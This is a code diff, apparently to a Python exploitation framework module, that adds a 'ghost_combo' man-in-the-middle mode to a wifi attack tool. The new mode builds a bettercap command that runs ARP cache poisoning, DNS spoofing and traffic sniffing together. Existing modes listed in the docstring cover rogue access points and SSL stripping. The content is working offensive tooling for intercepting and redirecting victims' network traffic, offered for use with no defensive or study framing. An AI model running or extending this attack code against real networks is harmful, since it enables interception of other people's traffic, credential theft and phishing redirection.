@@ -10,9 +10,10 @@ Attack modes:
   - ap_bridge       Rogue AP with NAT to upstream (transparent proxy)
   - arp_spoof       ARP cache poisoning on existing network
   - dns_spoof       DNS spoofing via dnsmasq/dnschef
+  - ghost_combo     ARP + DNS spoofing combo (Ghost-Phisher style)
   - ssl_strip       HTTP downgrade via sslstrip2 or bettercap
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -47,7 +48,7 @@ class Exploit(Exploit):
         "devices": ("wifi",),
     }
 
-    mode = OptString("ap_bridge", "MITM mode: ap_bridge | arp_spoof | dns_spoof | ssl_strip")
+    mode = OptString("ap_bridge", "MITM mode: ap_bridge | arp_spoof | dns_spoof | ghost_combo | ssl_strip")
     ap_interface = OptString("wlan0", "Interface for rogue AP")
     upstream_interface = OptString("eth0", "Interface for upstream internet (NAT)")
     target_ip = OptString("", "Target IP for ARP spoof (blank = gateway)")
@@ -88,6 +89,21 @@ class Exploit(Exploit):
             cmd.extend(["-eval", "set dns.spoof.domains {}; set dns.spoof.address {}; dns.spoof on; net.sniff on".format(
                 self.dns_target, self.dns_redirect_ip)])
 
+        elif self.mode == "ghost_combo":
+            iface = self.upstream_interface or self.ap_interface
+            cmd.extend(["-iface", iface])
+            eval_cmd = (
+                "set arp.spoof.targets {targets}; "
+                "set dns.spoof.domains {domains}; "
+                "set dns.spoof.address {redir}; "
+                "arp.spoof on; dns.spoof on; net.sniff on"
+            ).format(
+                targets=self.target_ip if self.target_ip else "",
+                domains=self.dns_target,
+                redir=self.dns_redirect_ip,
+            )
+            cmd.extend(["-eval", eval_cmd])
+
         elif self.mode == "ssl_strip":
             cmd.extend(["-iface", self.ap_interface])
             cmd.extend(["-eval", "set http.proxy.sslstrip true; http.proxy on; net.sniff on"])
@@ -96,7 +112,7 @@ class Exploit(Exploit):
 
     def run(self) -> None:
         """Execute MITM attack."""
-        valid_modes = ("ap_bridge", "arp_spoof", "dns_spoof", "ssl_strip")
+        valid_modes = ("ap_bridge", "arp_spoof", "dns_spoof", "ghost_combo", "ssl_strip")
         if self.mode not in valid_modes:
             print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
             return
